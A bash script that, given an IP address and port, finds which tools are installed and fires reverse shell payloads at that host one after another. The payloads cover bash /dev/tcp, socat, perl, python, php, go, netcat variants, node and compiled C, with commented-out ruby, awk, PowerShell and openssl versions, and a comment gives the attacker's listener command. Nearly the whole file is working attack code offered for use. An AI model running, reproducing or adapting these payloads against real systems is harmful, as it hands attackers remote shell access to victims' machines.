#!/bin/bash

###############################################################################
########################### Basic helper functions ###########################
###############################################################################

show_usage() {
	echo "usage: $(basename $0) [-h] IP PORT" 
	echo ""
	echo -n "Simple Reverse Shell script in various languages and tools"
	echo " that connects to a remote machine."
}

show_help() {
	show_usage
	echo ""
	echo "positional arguments:"
	echo "  IP          IPv4 address of the remote machine"
	echo "  PORT        Port of the remote machine"
	echo ""
	echo "optional arguments:"
	echo "  -h, --help	show this help message and exit"
}

# Check the existence of a command
command_exists() {
	command -v "$1" > /dev/null 2>&1;
}

# Get the OS of the system
detect_os() {

	UNAME=$(command -v uname)

	case $( "${UNAME}" | tr '[:upper:]' '[:lower:]') in
	linux*)
		OS='linux';;
	darwin*)
		OS='macos';;
	*bsd*)
		OS='bsd';;
	msys*|cygwin*|mingw*)
		# or possible 'bash on windows'
		OS='windows';;
	nt|win*)
		OS='windows';;
	*)
		OS='unknown';;
	esac
}

###############################################################################
############ Reverse Shell payloads in various languages and tools ############
###############################################################################
# All reverse shell implementations in functions
# Cheat Sheet from: https://github.com/swisskyrepo/PayloadsAllTheThings
# On Attacker Machine run: nc -lnvp 4444

bash_rev_shell() {
	bash -i >& /dev/tcp/$1/$2 0>&1
}

socat_rev_shell() {
	socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$1:$2
}

perl_rev_shell() {
	perl -e "use Socket;\$i=\"$1\";\$p=$2;\
	socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));\
	if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");\
	open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};"
}

python2_rev_shell() {
	export RHOST=$1 
	export RPORT=$2
	python -c "import sys,socket,os,pty;s=socket.socket();\
	s.connect((os.getenv('RHOST'),int(os.getenv('RPORT'))));\
	[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn('/bin/sh')"
}

python3_rev_shell() {
	export RHOST=$1 
	export RPORT=$2
	python3 -c "import sys,socket,os,subprocess;s=socket.socket();\
	s.connect((os.getenv('RHOST'),int(os.getenv('RPORT'))));\
	[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(['/bin/sh'])"
}

php_rev_shell() {
	#TODO: Check for more file descriptors
	php -r "\$sock=fsockopen(\"$1\",$2);exec(\"/bin/sh -i <&3 >&3 2>&3\");"
}

go_rev_shell() {
	echo "package main;import\"os/exec\";import\"net\";\
	func main(){c,_:=net.Dial(\"tcp\",\"$1:$2\");\
	cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;\
	cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}">\
	/tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
}

nc_rev_shell() {
	if [ "$OS" = "bsd" ]; then
		# Netcat OpenBsd
		rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $1 $2 >/tmp/f
	else
		# Netcat Traditional
		nc -e /bin/sh $1 $2
		nc -e /bin/bash $1 $2
		nc -c bash $1 $2
	fi

	if command_exists busybox; then
		# Netcat BusyBox
		rm -f /tmp/fb;mknod /tmp/fb p;cat /tmp/fb|/bin/sh -i 2>&1|nc $1 $2 >/tmp/fb
	fi
}

ncat_rev_shell() {
	ncat $1 $2 -e /bin/bash
}

node_rev_shell() {
	echo """
	(function(){
		var net = require('net'),
			cp = require('child_process'),
			sh = cp.spawn('/bin/sh', []);
		var client = new net.Socket();
		client.connect($2, '$1', function(){
			client.pipe(sh.stdin);
			sh.stdout.pipe(client);
			sh.stderr.pipe(client);
		});
		return /a/; // Prevents the Node.js application form crashing
	})();
	""" | node -
}

c_rev_shell(){
	# Check which compiler is available
	if [ "$3" = "gcc" ]; then
		CC="gcc"
	else
		CC="clang"
	fi

	echo """
	#include <stdio.h>
	#include <sys/socket.h>
	#include <sys/types.h>
	#include <stdlib.h>
	#include <unistd.h>
	#include <netinet/in.h>
	#include <arpa/inet.h>

	int main(void){
		int port = $2;
		struct sockaddr_in revsockaddr;

		int sockt = socket(AF_INET, SOCK_STREAM, 0);
		revsockaddr.sin_family = AF_INET;       
		revsockaddr.sin_port = htons(port);
		revsockaddr.sin_addr.s_addr = inet_addr(\"$1\");

		connect(sockt, (struct sockaddr *) &revsockaddr, 
		sizeof(revsockaddr));
		dup2(sockt, 0);
		dup2(sockt, 1);
		dup2(sockt, 2);

		char * const argv[] = {\"/bin/sh\", NULL};
		execve(\"/bin/sh\", argv, NULL);

		return 0;       
	}
	""" > /tmp/shell.c && $CC /tmp/shell.c --output csh && ./csh && \
		rm /tmp/shell.c && rm csh
}

gcc_rev_shell() {
	c_rev_shell $1 $2 "gcc"
}

clang_rev_shell() {
	c_rev_shell $1 $2 "clang"
}

# FIX: Does not close by itself
ruby_rev_shell() {
	echo "Ruby not implemented"

	# ruby -rsocket -e "exit if fork;c=TCPSocket.new('$1','$2');\
	# loop{c.gets.chomp!;(exit! if \$_=='exit');\
	# (\$_=~/cd (.+)/i?(Dir.chdir(\$1)):(IO.popen(\$_,?r){\
	# |io|c.print io.read}))rescue c.puts 'failed: #{\$_}'}"
}

# FIX: Does not close by itself
awk_rev_shell() {
	echo "AWK not implemented"
	
	# awk "BEGIN {s = \"/inet/tcp/0/$1/$2\"; while(42) { do{ \
	# printf \"shell>\" |& s; s |& getline c; if(c){ \
	# while ((c |& getline) > 0) print \$0 |& s; close(c); } } \
	# while(c != \"exit\") close(s); }}" /dev/null
}

# FIX: suspended (tty input)
pwsh_rev_shell() {
	echo "Powershell not implemented"

	# pwsh -nop -c "\$client = New-Object System.Net.Sockets.TCPClient('$1',$2);\
	# \$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};\
	# while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = \
	# (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0,\$i);\
	# \$sendback = (iex \$data 2>&1 | Out-String );\
	# \$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\
	# \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\
	# \$stream.Write(\$sendbyte,0,\$sendbyte.Length);\
	# \$stream.Flush()};\$client.Close()"
}

# FIX: suspended (tty input)
openssl_rev_shell() {
	# On Attacker
	# openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
	# openssl s_server -quiet -key key.pem -cert cert.pem -port $2
	# or
	# ncat --ssl -vv -l -p $2

	# On Victim
	echo "OpenSSL not implemented"

	# rm -f /tmp/s;mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | \
	# openssl s_client -quiet -connect $1:$2 > /tmp/s; rm /tmp/s
}

###############################################################################
###### Main Function: Parses arguments, executes all available payloads #######
###############################################################################

# Number of positional arguments: IP, PORT
parsed_pos_args=0

# Create CLI interface with arguments
while [[ $# -gt 0 ]]; do
	case $1 in
		-h|--help)
			show_help
			exit 0
			;;
		*)
			# Count up parsed positional arguments
			parsed_pos_args=$((parsed_pos_args+1))
			
			case $parsed_pos_args in
				1)
					# 1st positional argument
					IP=$1
					;;
				2)
					# 2nd positional argument
					PORT=$1
					;;
				*)
					# Extra positional arguments
					echo "$(basename $0): error: unrecognized arguments: $1"
					exit 1
					;;
			esac
			shift
			;;
	esac
done

# Check if arguments are supplied
if [[ -z $IP ]]; then
        echo "$(basename $0): error: the following arguments are required: IP PORT"
        exit 1
elif [[ -z $PORT ]]; then
        echo "$(basename $0): error: the following arguments are required: PORT"
        exit 1
fi

# Detect host OS
detect_os
echo "Host OS: $OS"
echo ""

# Array of all possible reverse shell languages and tools
tools=("bash" "socat" "perl" "python2" "python3" "php" "go" "nc" "ncat"
	 "node" "gcc" "clang" "ruby" "awk" "pwsh" "openssl")

# Array of all available reverse shell languages and tools
tools_avail=()

# Check which tools are installed
echo "Tools availability:"
for tool in "${tools[@]}"; do
	if command_exists $tool; then
		echo "$tool		exists"
		tools_avail+=($tool)
	else
		echo "$tool		does not exists"
	fi
done
echo ""

# Execute with all available tools
echo "Executing payloads:"
for tool in "${tools_avail[@]}"; do
	echo "########## $tool ##########"
	${tool}_rev_shell $IP $PORT > /dev/null 2>&1;
	if [[ $? -eq 0 ]]; then
		echo "No errors when executed payload"
	else
		echo "Failed executing payload (Connection failed)"
	fi
	echo ""
	# sleep 1
done
echo ""
